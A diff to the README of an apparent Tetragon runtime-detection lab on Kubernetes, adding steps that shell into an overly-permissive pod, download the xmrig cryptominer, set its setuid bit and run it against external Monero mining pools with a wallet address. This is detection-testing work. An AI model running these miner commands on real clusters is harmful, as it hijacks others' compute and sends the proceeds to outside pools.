@@ -96,16 +96,62 @@ Enable visibility to capability & namespace changes via the ```configmap``` by s
 kubectl edit cm -n kube-system tetragon-config
 ```
 
+<img width="1105" alt="Screenshot 2023-06-09 at 20 20 58" src="https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/e1d176ec-7ecd-4e89-a41d-737423fb6e60">
+
+
 Restart the Tetragon daemonset to enforce those changes:
 ```
 kubectl rollout restart -n kube-system ds/tetragon
 ```
 
+The Tetragon agent has since restarted and therefore is only 21 seconds old:
+
+<img width="1105" alt="Screenshot 2023-06-09 at 20 22 15" src="https://github.com/nigeldouglas-itcarlow/Tetragon-Lab/assets/126002808/a7ced293-c58b-4150-9029-e8e4bf5031ca">
+
+
 Let's then open a new terminal window to monitor the events from the overly-permissive pod:
 ```
-kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f | tetra getevents --namespace default --pod test-pod-1
+kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f | tetra getevents -o compact --namespace default --pod test-pod-1
 ```
 
+In the first window, terminal shell into the overly-permissive pod:
+```
+kubectl exec -it test-pod-1 -- bash
+```
+
+Download the ```xmrig``` binary from the official Github repository:
+```
+curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
+```
+
+Unzip the tarbal package to access the malicious files:
+```
+tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
+```
+
+Move to the directory holding the miner:
+```
+cd xmrig-6.16.4
+```
+For the purpose of testing, run ```chmod``` to trigger the SetGid Bit detection:
+```
+chmod u+s xmrig
+```
+Should trigger the detection, but there's likely no actual change here:
+```
+find / -perm /6000 -type f
+```
+Run the cryptominer in background mode (this won't show anything in your shell)
+```
+./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero
+```
+
+## Monitoring Network Activity
+
+Use the Stratum protocol
+```
+./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
+```
 
 ## Background Checks
 
